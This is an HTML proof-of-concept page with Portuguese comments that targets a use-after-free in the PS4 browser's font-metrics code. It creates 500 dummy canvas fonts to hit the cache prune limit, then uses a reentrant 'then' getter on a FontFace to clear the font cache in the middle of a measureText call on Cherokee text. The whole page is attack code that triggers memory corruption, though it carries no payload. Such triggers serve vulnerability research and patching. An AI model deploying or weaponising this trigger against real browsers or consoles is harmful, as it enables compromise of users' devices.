<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>PoC Mínima - FontMetrics UAF (500 Dummies)</title>
</head>
<body>
<p>PoC Mínima para o FontMetrics UAF no PS4 (Teste 2).</p>
<pre id="log"></pre>
<script>
function log(msg) {
    document.getElementById('log').textContent += msg + '\n';
}

// Carregar o Ahem.woff localmente de forma síncrona
const xhr = new XMLHttpRequest();
xhr.open('GET', 'resources/Ahem.woff', false);
xhr.overrideMimeType('text/plain; charset=x-user-defined');
xhr.send();

if (xhr.status === 200 || xhr.status === 0) {
    const text = xhr.responseText;
    const bytes = new Uint8Array(text.length);
    for (let i = 0; i < text.length; i++) {
        bytes[i] = text.charCodeAt(i) & 0xff;
    }
    const blob = new Blob([bytes], { type: 'font/woff' });
    const dataUrl = URL.createObjectURL(blob);

    log('A criar 500 elementos dummy para atingir o limite de prune do PS4...');
    for (let i = 0; i < 500; i++) {
        let dummy = document.createElement('canvas');
        dummy.width = 1; 
        dummy.height = 1;
        dummy.getContext('2d').font = '10px "Z' + i + '"';
    }

    let face = new FontFace('BF1', 'url("' + dataUrl + '")');
    document.fonts.add(face);
    void face.loaded;

    // Configurar o contexto combinando Times (primária) e a fonte de teste (fallback)
    let context = document.createElement('canvas').getContext('2d');
    context.width = 64;
    context.height = 64;
    context.font = '10px Times, BF1';

    let reentered = false;
    Object.defineProperty(face, 'then', {
        configurable: true,
        get() {
            if (reentered) return undefined;
            reentered = true;
            // O gatilho de reentrância que invalida o seletor de fontes e limpa o cache
            document.fonts.add(new FontFace('Unrelated', 'local("x")'));
            reentered = false;
        }
    });

    log('A chamar measureText com caracteres Cherokee...');
    let metrics = context.measureText('\u13A0\u13A2\u13A4');
    log('PASS: Medição concluída (Width: ' + metrics.width + ').');
} else {
    log('ERRO: Falha ao carregar o ficheiro Ahem.woff');
}
</script>
</body>
</html>
